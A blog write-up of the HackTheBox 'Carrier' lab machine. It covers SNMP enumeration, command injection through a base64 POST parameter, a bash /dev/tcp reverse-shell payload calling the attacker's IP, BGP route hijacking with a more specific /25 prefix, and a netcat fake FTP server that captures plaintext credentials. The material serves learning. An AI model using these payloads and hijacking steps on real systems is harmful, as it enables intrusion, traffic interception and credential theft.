---
layout: post
title:  "HackTheBox: Carrier writeup"
date:   2019-03-16 22:00:00 +0100
comments: true
author: BoiteAKlou
categories:
- "Writeup"
- "Pentest"
- "Network"
- "Web"
---

![Carrier box]({{ "/assets/2019-03-16/carrier-box.png" | absolute_url }} "Carrier Box")

Carrier was a very interesting box where a **web command injection** gave access to a **BGP router**. After some **BGP Hijacking** magic, it was possible to retrieve the FTP credentials of a rich Nigerian Prince, which allowed us to read the flag stored on this FTP server...
 <!--excerpt-->

## Table of Contents
{:.no_toc}

* TOC
{:toc}


## Initial Foothold And User Access

### Recon

The initial `nmap` scan revealed an Apache web server on port 80 and an SSH server on port 22.

```bash
$ nmap -sC -sV -vvv 10.10.10.105
[...]
PORT   STATE    SERVICE REASON      VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDI2Jfx6VeMU2wFDys5YoSIVCu4U626/VDawUrXKa5SR+D8HaNvt6QFECtQumoFcYzxD7Jnd3PKw/dXTXvePTPnolDUNV3oim
X8gEI3iY157v5scgrOKFjw39cTMuTfLc7/rM8e2TOeziN4yzzLfWAiTbe4wfiDe8cea7zJ1RFwvgGc398xiOA8bo1nwMD0wUkduJhtH4V98LpJZOVB4tMmtCdyb1T+e3HIR/1Wbm
MBLs0e6Cc/rf+K8vgqu6Tu/o4o8/TZ9aH9K5xoDRUXjU2R1w/Bi0HvYYHFRf664/NG9WcK/R0VlV6j92DOYL9wdUYwANyQPc4YCDfyuM6F6Bbd
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJToeoLQWJwkfcWBimMzO4E6BKOaHbTkWIk1uHoniOdaUaDL5C6MO2NeYYSaru
/ikAYSHPU83p1p6hNcOJVy+OY=
|   256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIN0vm7BcvmBgddJb7k1W7qUkBgn2n0T1bdOU6GV1JB8
80/tcp open     http    syn-ack     Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A UDP scan turned out to be also very interesting (`--max-retries 0` drastically reduces the scanning time).

```bash
$ sudo nmap -sU --max-retries 0 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-16 19:38 CET
Warning: 10.10.10.105 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.105
Host is up (0.040s latency).
Not shown: 991 open|filtered ports
PORT      STATE  SERVICE
161/udp   open   snmp
[...]
```

### Very SNMP

**Nmap Scripting Engine** provides a script named *snmp-brute*, which is useful for bruteforcing snmp communities.

```bash
$ sudo nmap -sU --script snmp-brute -p161 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-16 19:42 CET
Nmap scan report for 10.10.10.105
Host is up (0.041s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute:
|_  public - Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
```

`snmpwalk` is a script automating the exploration of a MIB for a given community. Thanks to this tool, we could retrieve a string that will be essential in the rest of the box.

```bash
$ snmpwalk -c public 10.10.10.105 -v1
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB
```

Let's move on to the web server!

### Lyghtspeed web server

The web server showed a login page when browsing to [http://10.10.10.105:80](http://10.10.10.105:80) as well as **error codes 45007 and 45009**.

![Lyghtspeed login]({{ "/assets/2019-03-16/lyghtspeed-login.png" | absolute_url }} "Lyghtspeed login")

Trivial username/password combinations were not successful so I focused on the enumeration using `gobuster`.

```bash
$ gobuster -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.105/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/03/16 20:14:41 Starting gobuster
=====================================================
/index.php (Status: 200)
/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
/css (Status: 301)
/js (Status: 301)
/tickets.php (Status: 302)
/fonts (Status: 301)
/dashboard.php (Status: 302)
/debug (Status: 301)
/diag.php (Status: 302)
=====================================================
2019/03/16 20:17:32 Finished
=====================================================
```

Most of the potentially interesting pages redirected to the login page. However, a pdf file named *"error_codes.pdf"* was available under **/doc**.

![Lyghtspeed /doc]({{ "/assets/2019-03-16/lyghtspeed-doc.png" | absolute_url }} "Lyghtspeed /doc")

**error_codes.pdf** gives a description for every error code of the Lyghtspeed Management Platform. Let's study the meaning of codes **45007** and **45009** that we've seen ealier on the login page.

![Lyghtspeed codes]({{ "/assets/2019-03-16/lyghtspeed-codes.png" | absolute_url }} "Lyghtspeed codes")

The string we found in the MIB is actually **the serial number of the chassis** (SN#NET_45JDX23).

Thanks to this indication, I managed to login with the following credentials: **admin/NET_45JDX23**.

### From Command Injection to Reverse Shell

Once logged in, a dashboard and two other pages were accessible.

![Lyghtspeed dashboard]({{ "/assets/2019-03-16/lyghtspeed-dashboard.png" | absolute_url }} "Lyghtspeed dashboard")

#### Tickets

The **"Tickets"** page gave a lot of clues about the second part of the exploitation. It was mentioning a Nigerian Prince having issues connecting to **a FTP server**. **BGP routing** among AS was also evoked.

![Lyghtspeed tickets]({{ "/assets/2019-03-16/lyghtspeed-tickets.png" | absolute_url }} "Lyghtspeed tickets")

#### Diagnostics

The "**Diagnostics**" page seemed to show the output of the command `ps -aux | grep quagga | grep -v grep`.

![Lyghtspeed diagnostics]({{ "/assets/2019-03-16/lyghtspeed-diagnostics.png" | absolute_url }} "Lyghtspeed diagnostics")

After examining the **POST request** sent when clicking on "Verify status" with Burp, it occurred that the **check** parameter was the **base64-encoding** of "quagga".

![Lyghtspeed quagga]({{ "/assets/2019-03-16/lyghtspeed-quagga.png" | absolute_url }} "Lyghtspeed quagga")

Let's see if we can control the output by modifying this parameter:

![Lyghtspeed SSH]({{ "/assets/2019-03-16/lyghtspeed-ssh.png" | absolute_url }} "Lyghtspeed SSH")

Indeed, the output has been modified to show everything related to "ssh". Now, let's try to inject other commands in order to **get a reverse shell on the machine**.

> SPOILER: The user flag can be retrieved without getting a reverse shell but it is mandatory for the rest of the box.

#### Road to Reverse Shell

This one was pretty difficult to trigger, I must have tried a dozen of different reverse shell payloads before finding the right one: `; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.89/9999 0>&1"`

* **Base64** encode the payload: *OyAvYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODkvOTk5OSAwPiYxIg==*
* Setup a **local listener**: `nc -lvnp 9999`
* Send the command inside the POST request via the **check** parameter (Burp Repeater ).

```bash
$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.89] from (UNKNOWN) [10.10.10.105] 58148
bash: cannot set terminal process group (25835): Inappropriate ioctl for device
bash: no job control in this shell
root@r1:~#
```

Surprise! We're root already.

The user flag can be retrieved at **/root/user.txt**.

```bash
cat /root/user.txt
5649[...]
```

Half of the job is done, let's move on to the privilege escalation phase!

> NOTE: Only after finishing the box, I realized that I could have simply added my own ssh public key to /root/.ssh/authorized_keys, which would have allowed me to login via ssh...


## Privilege escalation

Upgrading to a **fully interactive reverse shell** is a good reflex to adopt as soon as we're dealing with a reverse shell (see my other article [Upgrading to a fully interactive reverse shell](https://www.boiteaklou.fr/Fully-interactive-reverse-shell.html)).

As a few hints suggested it, the privilege escalation part of this box is **heavily network-related**.

### Network configuration

The first step consisted in **understanding the network topology** and **examining every configuration files** that could give information about it.

The following diagram, available on the web server ([http://10.10.10.105/doc/diagram_for_tac.png](http://10.10.10.105/doc/diagram_for_tac.png)), was very helpful for understanding the network context:

![Lyghtspeed diagram]({{ "/assets/2019-03-16/lyghtspeed-diagram.png" | absolute_url }} "Lyghtspeed diagram")


#### Network interfaces

The router we're connected to has 3 network interfaces.

```bash
root@r1:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:d9:04:ea brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.99.64.2/24 brd 10.99.64.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fed9:4ea/64 scope link
       valid_lft forever preferred_lft forever
10: eth1@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:8a:f2:4f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.10.1/24 brd 10.78.10.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe8a:f24f/64 scope link
       valid_lft forever preferred_lft forever
12: eth2@if13: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe20:98df/64 scope link
       valid_lft forever preferred_lft forever
```

#### BGP configuration

The BGP configuration is available in **/etc/quagga/bgpd.conf**:

```bash
root@r1:~# cat /etc/quagga/bgpd.conf
cat /etc/quagga/bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

#### Routing table

The routing table can be displayed using `ip r`:

```bash
root@r1:~# ip r
ip r
default via 10.99.64.1 dev eth0 onlink
10.78.10.0/24 dev eth1  proto kernel  scope link  src 10.78.10.1
10.78.11.0/24 dev eth2  proto kernel  scope link  src 10.78.11.1
10.99.64.0/24 dev eth0  proto kernel  scope link  src 10.99.64.2
10.100.10.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.11.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.12.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.13.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.14.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.15.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.16.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.17.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.18.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.19.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.20.0/24 via 10.78.10.2 dev eth1  proto zebra
10.120.10.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.11.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.12.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.13.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.14.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.15.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.16.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.17.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.18.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.19.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.20.0/24 via 10.78.11.2 dev eth2  proto zebra
```

#### Updated network diagram

From the network configuration files, we can deduce the **IP address of other AS routers**, as well as the **subnets connected to these AS**. This gives the following updated diagram:

![Updated diagram]({{ "/assets/2019-03-16/updated-diagram.png" | absolute_url }} "Updated diagram")

### What's the plan?

* We know from the tickets on the web server, that there is **a valuable FTP server** in the **10.120.15.0/24 network**.

* Routes are **dynamically advertised via BGP** and we have control over a **BGP router**.

* The **priority of BGP routes** depends on the **size of the advertised subnet** (i.e. a route to 10.120.15.0/25 will be given a higher priority than one announcing 10.120.15.0/24).

If we sum up all of these assumptions, we should be able to **advertise a fake route to the FTP server** to our BGP neighbours so **the Nigerian Prince will try to connect to a server inside our own subnet**. Since we want to **steal his credentials**, we will need to **setup an FTP server** which will ask for a login and a password to anyone contacting it. Once those credentials stolen, we will stop advertising the fake route and connect to the real FTP server with the Nigerian Prince's logins.

Because a picture speaks a thousand words:

![Attack]({{ "/assets/2019-03-16/attack.png" | absolute_url }} "Attack")

Alright, it is time to move on to the realization.

### 10.120.15.0/24 scanning

We know the FTP server is somewhere inside the 10.120.15.0/24 subnet  but we don't have its **exact IP address**. A simple **bash script executing `ping` on the whole subnet** was enough to find out which hosts were up.

```bash
#!/bin/bash
if [ "$1" == "" ]
then
echo "Usage ./pingscript.sh [network]"
else
        for x in `seq 1 254`; do
                ping -c 1 $1.$x | grep "64 bytes" | cut -d" " -f4 | sed 's/.$//'
        done
fi
```

This script can be **uploaded to r1** using `wget` on a **local webserver running on our machine** that we have just set up with `python -m SimpleHTTPServer`.

```bash
root@r1:~# wget http://10.10.14.89:8000/pingscript.sh -O /tmp/script.sh
wget http://10.10.14.89:8000/pingscript.sh -O /tmp/script.sh
--2019-03-17 13:26:31--  http://10.10.14.89:8000/pingscript.sh
Connecting to 10.10.14.89:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 182 [text/x-sh]
Saving to: ‘/tmp/script.sh’

     0K                                                       100% 19.6M=0s

2019-03-17 13:26:31 (19.6 MB/s) - ‘/tmp/script.sh’ saved [182/182]
```

The result of the execution revealed two hosts: **10.120.15.1** and **10.120.15.10**.
```bash
root@r1:~# chmod +x /tmp/script.sh
chmod +x /tmp/script.sh
root@r1:~# /tmp/script.sh 10.120.15
/tmp/script.sh 10.120.15
10.120.15.1
10.120.15.10
```

Using the same technique as previously, I have uploaded **a static version of `nmap`** in order to **scan the two hosts** with more details.

#### 10.120.15.1

The scan on the first host found didn't show any FTP server.

```bash
root@r1:~# /tmp/nmap -v 10.120.15.1
/tmp/nmap -v 10.120.15.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-03-17 13:36 UTC
[...]
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp

Read data files from: /etc
Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
Raw packets sent: 1210 (53.216KB) | Rcvd: 1208 (48.388KB)
```

#### 10.120.15.10

10.120.15.10 seems to be our guy!

```bash
root@r1:~# /tmp/nmap -v 10.120.15.10
/tmp/nmap -v 10.120.15.10

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-03-17 13:38 UTC
[...]
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Read data files from: /etc
Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds
Raw packets sent: 1210 (53.216KB) | Rcvd: 1208 (48.392KB)
```

We can now move on to the **BGP Hijacking** part.

### BGP Hijacking

> NOTE: The way I did BGP Hijacking was not the intended one, but it was much easier and faster. For a clear explanation of the intended method, I recommend you to watch [ippsec's video](https://www.youtube.com/watch?v=2ZxRA8BgmnA) or to read [0xdf's writeup](https://0xdf.gitlab.io/2019/03/16/htb-carrier.html).

#### Fake route Advertising

Quagga routers can be administrated via `vtysh`. In order to **advertise a route to the BGP neighbors**, the following commands are enough:

```bash
root@r1:~# vtysh
vtysh

Hello, this is Quagga (version 0.99.24.1).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

r1# conf t
conf t
r1(config)# router bgp 100
router bgp 100
r1(config-router)# network 10.120.15.0/25
network 10.120.15.0/25
r1(config-router)# exit
exit
r1(config)# exit
exit
```

The prefix **/25** is voluntarily more specific than **/24** so that our route will be given **a higher priority**.

#### Changing eth2 ip address

Now, we have to **add the ip address of the FTP server to eth2 interface**.

```bash
root@r1:~# ip addr add 10.120.15.10/25 dev eth2
ip addr add 10.120.15.10/25 dev eth2
root@r1:~# ip a
ip a
[...]
12: eth2@if13: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet 10.120.15.10/25 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe20:98df/64 scope link
       valid_lft forever preferred_lft forever
```

The Nigerian Prince should now be **redirected to our machine**. We can verify this by **listening on port 21** with `nc`:

```bash
root@r1:~# nc -lvnp 21
nc -lvnp 21
Listening on [0.0.0.0] (family 0, port 21)



Connection from [10.78.10.2] port 21 [tcp/*] accepted (family 2, sport 44696)
USER root
PASV
QUIT
```

We can see that the user **root** is trying to login but it **disconnects instantly** since **our server is not answering**.

### Faking an FTP server

There is no need to code something complicated in order to **fake an FTP server**, it can be very simply done with `nc`. The **FTP protocol uses raw telnet commands** so we can fake a server by **typing response codes manually**. All we have to do is to reply with code **331** after the user has sent his username. Then, the user will supply his **password in plaintext**.

```bash
root@r1:~# nc -lvnp 21
nc -lvnp 21
Listening on [0.0.0.0] (family 0, port 21)

Connection from [10.78.10.2] port 21 [tcp/*] accepted (family 2, sport 44728)                                                          
USER root
331 Follow @BoiteAKlou    # Typed manually
PASS BGPtelc0rout1ng

PASV

QUIT
```

### Retrieving the flag

It looks like we have the **root credentials** of the **real FTP server**! Let's verify this.

After **removing the ip address of the FTP server from eth2** and resetting the BGP configuration, we are finally able to connect to **the real Carrier machine** (FTP credentials == SSH credentials).

```bash
root@r1:~# ip addr del 10.120.15.10/25 dev eth2
root@r1:~# ifdown eth2
ifdown eth2
root@r1:~# ifup eth2
ifup eth2
root@r1:~# ping -c 1 10.120.15.10
ping -c 1 10.120.15.10
PING 10.120.15.10 (10.120.15.10) 56(84) bytes of data.
64 bytes from 10.120.15.10: icmp_seq=1 ttl=63 time=0.054 ms

--- 10.120.15.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.054/0.054/0.054/0.000 ms
root@r1:~# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@r1:~# ssh root@10.120.15.10
ssh root@10.120.15.10
root@10.120.15.10's password: BGPtelc0rout1ng

Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 17 15:31:44 UTC 2019

  System load:  0.07               Users logged in:       0
  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
  Memory usage: 47%                IP address for lxdbr0: 10.99.64.1
  Swap usage:   1%                 IP address for lxdbr1: 10.120.15.10
  Processes:    220


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep  5 14:32:15 2018
root@carrier:~# ls
ls
root.txt  secretdata.txt
root@carrier:~# cat root.txt
cat root.txt
283[...]
```

## Final words

I would like to thank **snowscan**, the author of this great box. It's pretty rare to find network-related boxes because it requires a lot of preparation and materials. However, boxes like this are very realistic and allow us to learn a lot of new skills.

Thanks for reading this writeup, I hope you've enjoyed!

<p id="signature">BoiteAKlou :hammer:</p>
